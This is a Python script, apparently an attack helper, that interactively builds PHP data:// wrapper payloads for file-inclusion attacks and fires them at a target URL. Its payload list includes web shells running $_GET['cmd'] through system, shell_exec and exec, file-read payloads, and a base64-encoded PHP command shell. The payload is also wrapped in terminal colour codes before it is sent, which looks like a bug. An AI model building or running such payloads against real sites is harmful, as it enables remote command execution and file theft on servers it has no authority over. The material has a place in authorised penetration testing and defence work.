from termcolor import colored
import requests

def test_payload(website_address, payload):
    try:
        response = requests.get(website_address.replace('FUZZ', payload))
        return response.text
    except requests.exceptions.RequestException as e:
        return str(e)

def get_writing_model():
    models = ["data:", "data://"]
    print("Choose the writing model:")
    
    for i, model in enumerate(models, 1):
        print(colored(f"{i}. {model}", "cyan"))
    
    while True:
        try:
            choice = int(input(colored("Enter the number corresponding to the writing model: ", "yellow")))
            if choice in range(1, len(models) + 1):
                return models[choice - 1]
            else:
                raise ValueError
        except ValueError:
            print(colored("Invalid choice! Please enter a valid number.", "red"))

def get_data_type():
    types = ["text/plain", "application/x-php", "application/x-httpd-php", "application/x-www-form-urlencoded"]
  
    print("\nChoose the data type:")
    
    for i, data_type in enumerate(types, 1):
        print(colored(f"{i}. {data_type}", "cyan"))
    
    while True:
        try:
            choice = int(input(colored("Enter the number corresponding to the data type: ", "yellow")))
            if choice in range(1, len(types) + 1):
                return types[choice - 1]
            else:
                raise ValueError
        except ValueError:
            print(colored("Invalid choice! Please enter a valid number.", "red"))

def get_payload():
    while True:
        want_echo = input(colored("Use echo? (y/n): ", "yellow")).lower()
        if want_echo in ["y", "n"]:
            break
        else:
            print(colored("Invalid choice! Please enter 'y' or 'n'.", "red"))
      
    while True:
        add_cmd = input(colored("Do you want to add '&cmd=' to the payload? (y/n): ", "yellow")).lower()
        if add_cmd in ["y", "n"]:
            break
        else:
            print(colored("Invalid choice! Please enter 'y' or 'n'.", "red"))

    payloads = [
        "phpinfo();",
        "system($_GET['cmd']);",
        "shell_exec($_GET['cmd']);",
        "exec($_GET['cmd']);", 
        "readfile('name');",
        "file_get_contents('name');",
        "base64_encode(file_get_contents('name'));",
        "base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="
    ]
  
    if want_echo == "y":
        payloads = ["echo " + p for p in payloads]

    print("\nChoose payload:")
    for i, payload in enumerate(payloads, 1):
        print(colored(f"{i}. {payload}", "cyan"))

    while True:
        try:
            choice = int(input(colored("Enter the number corresponding to the payload type: ", "yellow")))
            if choice == 8:
                payload = payloads[choice - 1]
                break
            elif choice in range(1, len(payloads) + 1):
                if choice in [5, 6, 7]:
                    filename = input(colored("\nEnter filename: ", "yellow"))
                    payload = payloads[choice - 1].replace('name', filename)
                else:
                    payload = payloads[choice - 1]
                
                if add_cmd == "y":
                    payload = "<?php " + payload + " ?>" + "&cmd="
                else:
                    payload = "<?php " + payload + " ?>"
                break
            else:
                raise ValueError
        except ValueError:
            print(colored("Invalid choice! Please enter a valid number.", "red"))

    return colored(payload, "green")

def main():
    model = get_writing_model()
    data_type = get_data_type()
    
    payload = get_payload()

    # Modify this part
    if "base64" in payload:
        constructed_payload = f"{model}{data_type};{payload}"
    else:
        if isinstance(payload, str):
            constructed_payload = f"{model}{data_type},{payload}"
        else:
            constructed_payload = payload + f"{model}{data_type}"
    # End of modification

    print(colored(f"\nYour constructed payload is:\n\n{constructed_payload}", "blue"))

    proceed = input(colored("\nDo you want to test the payload on the website? (y/n): ", "yellow")).lower()
    if proceed == "y":
        website_address = input(colored("Enter the base website address to test the payload on: ", "yellow"))
        result = test_payload(website_address, constructed_payload)
        print(colored(f"\nTesting the payload on the website: {website_address.replace('FUZZ', 'your_payload_here')}", "magenta"))
        print(colored("Result:", "magenta"))
        print(result)
    elif proceed == "n":
        print(colored("\nGoodbye!", "blue"))
    else:
        print(colored("Invalid choice! Please enter 'y' or 'n'.", "red"))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\nGoodbye!", "blue"))
